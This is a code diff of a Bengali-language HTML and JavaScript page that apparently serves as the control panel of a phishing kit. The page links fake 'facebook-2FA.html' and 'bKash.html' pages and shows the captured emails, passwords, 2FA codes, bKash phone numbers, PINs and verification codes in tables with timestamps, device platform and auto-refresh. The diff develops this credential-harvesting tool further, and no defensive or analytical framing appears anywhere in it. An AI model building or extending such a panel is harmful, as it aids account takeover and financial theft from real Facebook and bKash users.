@@ -260,10 +260,8 @@
             min-height: 200px;
             max-height: 400px;
             overflow-y: auto;
-            padding: 10px;
             background: #f7fafc;
             border-radius: 5px;
-            font-family: monospace;
             font-size: 0.9rem;
         }
         
@@ -272,27 +270,6 @@
             font-style: italic;
             text-align: center;
             padding: 20px;
-        }
-        
-        .data-item {
-            padding: 8px;
-            border-bottom: 1px solid #e2e8f0;
-            display: flex;
-            justify-content: space-between;
-        }
-        
-        .data-item:last-child {
-            border-bottom: none;
-        }
-        
-        .data-key {
-            font-weight: 600;
-            color: #4a5568;
-        }
-        
-        .data-value {
-            color: #2d3748;
-            word-break: break-all;
         }
         
         footer {
@@ -333,11 +310,133 @@
             margin-bottom: 15px;
         }
         
-        .timestamp {
+        /* টেবিল স্টাইল */
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 10px;
+        }
+        
+        .data-table th {
+            background: #4a5568;
+            color: white;
+            padding: 12px 8px;
+            text-align: left;
+            font-weight: 600;
+            font-size: 0.85rem;
+            position: sticky;
+            top: 0;
+        }
+        
+        .data-table td {
+            padding: 10px 8px;
+            border-bottom: 1px solid #e2e8f0;
             font-size: 0.8rem;
-            color: #718096;
-            text-align: right;
-            margin-top: 5px;
+        }
+        
+        .data-table tr:hover {
+            background: #edf2f7;
+        }
+        
+        .data-table tr:nth-child(even) {
+            background: #f7fafc;
+        }
+        
+        .data-table tr:nth-child(even):hover {
+            background: #e2e8f0;
+        }
+        
+        .platform-badge {
+            background: #667eea;
+            color: white;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            font-weight: 600;
+        }
+        
+        .type-badge {
+            background: #48bb78;
+            color: white;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            font-weight: 600;
+        }
+        
+        .type-badge.login {
+            background: #4299e1;
+        }
+        
+        .type-badge.verification {
+            background: #ed8936;
+        }
+        
+        .success-alert {
+            display: none;
+            background: #c6f6d5;
+            color: #22543d;
+            padding: 12px 20px;
+            border-radius: 8px;
+            margin: 10px 0;
+            text-align: center;
+            border-left: 4px solid #48bb78;
+            font-weight: 600;
+        }
+        
+        .auto-refresh {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin: 15px 0;
+            color: #4a5568;
+            font-size: 0.9rem;
+        }
+        
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 24px;
+        }
+        
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 24px;
+        }
+        
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 16px;
+            width: 16px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+        
+        input:checked + .slider {
+            background-color: #48bb78;
+        }
+        
+        input:checked + .slider:before {
+            transform: translateX(26px);
         }
     </style>
 </head>
@@ -401,16 +500,30 @@
                 <button class="btn refresh-btn" onclick="loadInputData()">ডেটা রিফ্রেশ করুন</button>
                 <button class="btn clear-btn" onclick="clearAllData()">সব ডেটা ডিলিট করুন</button>
             </div>
+            
+            <div class="auto-refresh">
+                <span>অটো রিফ্রেশ:</span>
+                <label class="switch">
+                    <input type="checkbox" id="autoRefreshToggle" onchange="toggleAutoRefresh()">
+                    <span class="slider"></span>
+                </label>
+                <span id="autoRefreshStatus">বন্ধ</span>
+            </div>
+            
+            <div class="success-alert" id="successAlert">
+                ডেটা সফলভাবে লোড করা হয়েছে!
+            </div>
+            
             <div class="data-container">
                 <div class="data-box">
-                    <div class="data-title">অপশন ১ ইনপুট ডেটা</div>
+                    <div class="data-title">ফেসবুক ডেটা</div>
                     <div class="data-content" id="dataContent1">
                         <div class="empty-data">কোন ডেটা পাওয়া যায়নি</div>
                     </div>
                 </div>
                 
                 <div class="data-box">
-                    <div class="data-title">অপশন ২ ইনপুট ডেটা</div>
+                    <div class="data-title">bKash ডেটা</div>
                     <div class="data-content" id="dataContent2">
                         <div class="empty-data">কোন ডেটা পাওয়া যায়নি</div>
                     </div>
@@ -431,15 +544,7 @@
                     name: "facebook-2FA.html", 
                     size: "8.2 KB", 
                     url: "facebook-2FA.html", 
-                    dataKey: "facebookData",
-                    fields: ["email", "pass", "2fa_code"]
-                },
-                { 
-                    name: "Netflix.html", 
-                    size: "15.7 KB", 
-                    url: "Netflix.html", 
-                    dataKey: "netflixData",
-                    fields: ["email", "password"]
+                    dataKey: "facebookData"
                 }
             ],
             option2: [
@@ -447,8 +552,7 @@
                     name: "bKash.html", 
                     size: "12.5 KB", 
                     url: "bKash.html", 
-                    dataKey: "bkashData",
-                    fields: ["phone", "pass", "2fa_code"]
+                    dataKey: "bkashData"
                 }
             ]
         };
@@ -458,37 +562,16 @@
             option1: null,
             option2: null
         };
+
+        let autoRefreshInterval = null;
         
         // LocalStorage থেকে ডেটা লোড করা
         function getStoredData() {
             const storedData = localStorage.getItem('userInputData');
             return storedData ? JSON.parse(storedData) : {
                 facebookData: [],
-                netflixData: [],
                 bkashData: []
             };
-        }
-        
-        // LocalStorage-এ ডেটা সেভ করা
-        function saveDataToStorage(data) {
-            localStorage.setItem('userInputData', JSON.stringify(data));
-        }
-        
-        // ডেমো ডেটা ইনিশিয়ালাইজ করা
-        function initializeDemoData() {
-            const storedData = getStoredData();
-            if (storedData.facebookData.length === 0) {
-                storedData.facebookData = [
-                    {
-                        email: "user@example.com",
-                        pass: "••••••••",
-                        "2fa_code": "123456",
-                        deviceInfo: '{"ua":"Mozilla/5.0...","platform":"Windows","res":"1920x1080"}',
-                        timestamp: new Date().toLocaleString()
-                    }
-                ];
-                saveDataToStorage(storedData);
-            }
         }
         
         // ফাইল লিস্ট তৈরি
@@ -594,178 +677,161 @@
         function loadInputData() {
             const storedData = getStoredData();
             
-            // অপশন ১ এর ডেটা দেখানো
-            dataContent1.innerHTML = '';
-            let option1HasData = false;
+            // ফেসবুক ডেটা টেবিল তৈরি
+            renderFacebookTable(storedData.facebookData);
             
-            files.option1.forEach(file => {
-                const fileData = storedData[file.dataKey];
-                if (fileData && fileData.length > 0) {
-                    option1HasData = true;
-                    const fileHeader = document.createElement('div');
-                    fileHeader.innerHTML = `<strong>${file.name}:</strong>`;
-                    fileHeader.style.marginBottom = '10px';
-                    fileHeader.style.paddingBottom = '5px';
-                    fileHeader.style.borderBottom = '1px solid #e2e8f0';
-                    dataContent1.appendChild(fileHeader);
-                    
-                    fileData.forEach((data, index) => {
-                        const dataSection = document.createElement('div');
-                        dataSection.style.marginBottom = '15px';
-                        dataSection.style.padding = '10px';
-                        dataSection.style.background = '#edf2f7';
-                        dataSection.style.borderRadius = '5px';
-                        
-                        // টাইমস্ট্যাম্প যোগ করা
-                        const timestamp = document.createElement('div');
-                        timestamp.className = 'timestamp';
-                        timestamp.textContent = `লগইন সময়: ${data.timestamp || 'অজানা'}`;
-                        dataSection.appendChild(timestamp);
-                        
-                        file.fields.forEach(field => {
-                            if (data[field]) {
-                                const dataItem = document.createElement('div');
-                                dataItem.className = 'data-item';
-                                const fieldName = getFieldDisplayName(field);
-                                dataItem.innerHTML = `
-                                    <span class="data-key">${fieldName}:</span>
-                                    <span class="data-value">${maskSensitiveData(field, data[field])}</span>
-                                `;
-                                dataSection.appendChild(dataItem);
-                            }
-                        });
-                        
-                        // ডিভাইস ইনফো দেখানো
-                        if (data.deviceInfo) {
-                            try {
-                                const deviceData = JSON.parse(data.deviceInfo);
-                                const deviceItem = document.createElement('div');
-                                deviceItem.className = 'data-item';
-                                deviceItem.innerHTML = `
-                                    <span class="data-key">ডিভাইস:</span>
-                                    <span class="data-value">${deviceData.ua ? deviceData.ua.substring(0, 50) + '...' : 'অজানা'}</span>
-                                `;
-                                dataSection.appendChild(deviceItem);
-                            } catch (e) {
-                                console.log('Device info parse error:', e);
-                            }
-                        }
-                        
-                        dataContent1.appendChild(dataSection);
-                    });
-                    
-                    const spacer = document.createElement('div');
-                    spacer.style.marginBottom = '15px';
-                    dataContent1.appendChild(spacer);
-                }
-            });
+            // bKash ডেটা টেবিল তৈরি
+            renderBkashTable(storedData.bkashData);
             
-            if (!option1HasData) {
-                dataContent1.innerHTML = '<div class="empty-data">কোন ডেটা পাওয়া যায়নি</div>';
-            }
-            
-            // অপশন ২ এর ডেটা দেখানো
-            dataContent2.innerHTML = '';
-            let option2HasData = false;
-            
-            files.option2.forEach(file => {
-                const fileData = storedData[file.dataKey];
-                if (fileData && fileData.length > 0) {
-                    option2HasData = true;
-                    const fileHeader = document.createElement('div');
-                    fileHeader.innerHTML = `<strong>${file.name}:</strong>`;
-                    fileHeader.style.marginBottom = '10px';
-                    fileHeader.style.paddingBottom = '5px';
-                    fileHeader.style.borderBottom = '1px solid #e2e8f0';
-                    dataContent2.appendChild(fileHeader);
-                    
-                    fileData.forEach((data, index) => {
-                        const dataSection = document.createElement('div');
-                        dataSection.style.marginBottom = '15px';
-                        dataSection.style.padding = '10px';
-                        dataSection.style.background = '#edf2f7';
-                        dataSection.style.borderRadius = '5px';
-                        
-                        // টাইমস্ট্যাম্প যোগ করা
-                        const timestamp = document.createElement('div');
-                        timestamp.className = 'timestamp';
-                        timestamp.textContent = `লগইন সময়: ${data.timestamp || 'অজানা'}`;
-                        dataSection.appendChild(timestamp);
-                        
-                        file.fields.forEach(field => {
-                            if (data[field]) {
-                                const dataItem = document.createElement('div');
-                                dataItem.className = 'data-item';
-                                const fieldName = getFieldDisplayName(field);
-                                dataItem.innerHTML = `
-                                    <span class="data-key">${fieldName}:</span>
-                                    <span class="data-value">${maskSensitiveData(field, data[field])}</span>
-                                `;
-                                dataSection.appendChild(dataItem);
-                            }
-                        });
-                        
-                        // ডিভাইস ইনফো দেখানো
-                        if (data.deviceInfo) {
-                            try {
-                                const deviceData = JSON.parse(data.deviceInfo);
-                                const deviceItem = document.createElement('div');
-                                deviceItem.className = 'data-item';
-                                deviceItem.innerHTML = `
-                                    <span class="data-key">ডিভাইস:</span>
-                                    <span class="data-value">${deviceData.ua ? deviceData.ua.substring(0, 50) + '...' : 'অজানা'}</span>
-                                `;
-                                dataSection.appendChild(deviceItem);
-                            } catch (e) {
-                                console.log('Device info parse error:', e);
-                            }
-                        }
-                        
-                        dataContent2.appendChild(dataSection);
-                    });
-                    
-                    const spacer = document.createElement('div');
-                    spacer.style.marginBottom = '15px';
-                    dataContent2.appendChild(spacer);
-                }
-            });
-            
-            if (!option2HasData) {
-                dataContent2.innerHTML = '<div class="empty-data">কোন ডেটা পাওয়া যায়নি</div>';
-            }
-            
-            alert('ডেটা সফলভাবে লোড করা হয়েছে!');
+            // সাকসেস মেসেজ শো করা
+            showSuccessMessage();
         }
         
-        // সেনসিটিভ ডেটা মাস্ক করা
-        function maskSensitiveData(fieldName, value) {
-            const sensitiveFields = ['pass', 'password', '2fa_code', 'pin'];
-            if (sensitiveFields.includes(fieldName)) {
-                return '•'.repeat(value.length);
+        // ফেসবুক ডেটা টেবিল রেন্ডার
+        function renderFacebookTable(facebookData) {
+            const dataContent1 = document.getElementById('dataContent1');
+            
+            if (!facebookData || facebookData.length === 0) {
+                dataContent1.innerHTML = '<div class="empty-data">কোন ফেসবুক ডেটা পাওয়া যায়নি</div>';
+                return;
             }
-            return value;
+            
+            let tableHTML = `
+                <table class="data-table">
+                    <thead>
+                        <tr>
+                            <th>ইমেইল</th>
+                            <th>পাসওয়ার্ড</th>
+                            <th>2FA কোড</th>
+                            <th>টাইপ</th>
+                            <th>সময়</th>
+                            <th>প্ল্যাটফর্ম</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+            `;
+            
+            facebookData.forEach((data, index) => {
+                const deviceInfo = data.deviceInfo ? JSON.parse(data.deviceInfo) : {};
+                const platform = deviceInfo.ua ? extractPlatform(deviceInfo.ua) : 'Unknown';
+                
+                tableHTML += `
+                    <tr>
+                        <td>${data.email || '-'}</td>
+                        <td>${data.pass ? '••••••••' : '-'}</td>
+                        <td>${data['2fa_code'] ? '••••••' : '-'}</td>
+                        <td><span class="type-badge ${data.type === 'login' ? 'login' : 'verification'}">${data.type === 'login' ? 'লগইন' : 'ভেরিফিকেশন'}</span></td>
+                        <td>${data.timestamp || 'অজানা'}</td>
+                        <td><span class="platform-badge">${platform}</span></td>
+                    </tr>
+                `;
+            });
+            
+            tableHTML += `
+                    </tbody>
+                </table>
+                <div style="text-align: center; margin-top: 10px; color: #718096; font-size: 0.8rem;">
+                    মোট রেকর্ড: ${facebookData.length}
+                </div>
+            `;
+            
+            dataContent1.innerHTML = tableHTML;
         }
         
-        // ফিল্ড ডিসপ্লে নাম
-        function getFieldDisplayName(field) {
-            const fieldNames = {
-                'email': 'ইমেইল',
-                'pass': 'পাসওয়ার্ড',
-                'password': 'পাসওয়ার্ড',
-                '2fa_code': '2FA কোড',
-                'phone': 'ফোন নম্বর',
-                'pin': 'পিন'
-            };
-            return fieldNames[field] || field;
+        // bKash ডেটা টেবিল রেন্ডার
+        function renderBkashTable(bkashData) {
+            const dataContent2 = document.getElementById('dataContent2');
+            
+            if (!bkashData || bkashData.length === 0) {
+                dataContent2.innerHTML = '<div class="empty-data">কোন bKash ডেটা পাওয়া যায়নি</div>';
+                return;
+            }
+            
+            let tableHTML = `
+                <table class="data-table">
+                    <thead>
+                        <tr>
+                            <th>ফোন নম্বর</th>
+                            <th>পিন</th>
+                            <th>ভেরিফিকেশন কোড</th>
+                            <th>টাইপ</th>
+                            <th>সময়</th>
+                            <th>প্ল্যাটফর্ম</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+            `;
+            
+            bkashData.forEach((data, index) => {
+                const deviceInfo = data.deviceInfo ? JSON.parse(data.deviceInfo) : {};
+                const platform = deviceInfo.ua ? extractPlatform(deviceInfo.ua) : 'Unknown';
+                const maskedPhone = data.phone ? data.phone.substring(0, 7) + 'XXXX' : '-';
+                
+                tableHTML += `
+                    <tr>
+                        <td>${maskedPhone}</td>
+                        <td>${data.pass ? '•••••' : '-'}</td>
+                        <td>${data['2fa_code'] ? '••••••' : '-'}</td>
+                        <td><span class="type-badge ${data.type === 'login' ? 'login' : 'verification'}">${data.type === 'login' ? 'লগইন' : 'ভেরিফিকেশন'}</span></td>
+                        <td>${data.timestamp || 'অজানা'}</td>
+                        <td><span class="platform-badge">${platform}</span></td>
+                    </tr>
+                `;
+            });
+            
+            tableHTML += `
+                    </tbody>
+                </table>
+                <div style="text-align: center; margin-top: 10px; color: #718096; font-size: 0.8rem;">
+                    মোট রেকর্ড: ${bkashData.length}
+                </div>
+            `;
+            
+            dataContent2.innerHTML = tableHTML;
+        }
+        
+        // প্ল্যাটফর্ম এক্সট্র্যাক্ট করা
+        function extractPlatform(userAgent) {
+            if (userAgent.includes('Android')) return 'Android';
+            if (userAgent.includes('iPhone') || userAgent.includes('iPad')) return 'iOS';
+            if (userAgent.includes('Windows')) return 'Windows';
+            if (userAgent.includes('Mac')) return 'Mac';
+            if (userAgent.includes('Linux')) return 'Linux';
+            return 'Other';
+        }
+        
+        // সাকসেস মেসেজ শো করা
+        function showSuccessMessage() {
+            const successAlert = document.getElementById('successAlert');
+            successAlert.style.display = 'block';
+            
+            // 3 সেকেন্ড পর মেসেজ হাইড করা
+            setTimeout(() => {
+                successAlert.style.display = 'none';
+            }, 3000);
         }
         
         // সব ডেটা ক্লিয়ার করা
         function clearAllData() {
             if (confirm('আপনি কি নিশ্চিত যে আপনি সব ডেটা ডিলিট করতে চান?')) {
                 localStorage.removeItem('userInputData');
-                initializeDemoData();
                 loadInputData();
-                alert('সব ডেটা ডিলিট করা হয়েছে!');
+            }
+        }
+        
+        // অটো রিফ্রেশ টগল করা
+        function toggleAutoRefresh() {
+            const toggle = document.getElementById('autoRefreshToggle');
+            const status = document.getElementById('autoRefreshStatus');
+            
+            if (toggle.checked) {
+                autoRefreshInterval = setInterval(loadInputData, 3000);
+                status.textContent = 'চালু';
+                status.style.color = '#48bb78';
+            } else {
+                clearInterval(autoRefreshInterval);
+                status.textContent = 'বন্ধ';
+                status.style.color = '#718096';
             }
         }
         
@@ -776,11 +842,8 @@
         const linkDisplay2 = document.getElementById('linkDisplay2');
         const visitLinkBtn1 = document.getElementById('visitLinkBtn1');
         const visitLinkBtn2 = document.getElementById('visitLinkBtn2');
-        const dataContent1 = document.getElementById('dataContent1');
-        const dataContent2 = document.getElementById('dataContent2');
         
         // প্রাথমিক রেন্ডার
-        initializeDemoData();
         renderFileLists();
         
         // ডিফল্ট হিসেবে ফাইল সিলেক্ট করা
@@ -793,9 +856,6 @@
         
         // পেজ লোড হলে ডেটা লোড করা
         window.addEventListener('load', loadInputData);
-        
-        // প্রতি 5 সেকেন্ডে ডেটা চেক করা (রিয়েল-টাইম আপডেটের জন্য)
-        setInterval(loadInputData, 5000);
     </script>
 </body>
 </html>
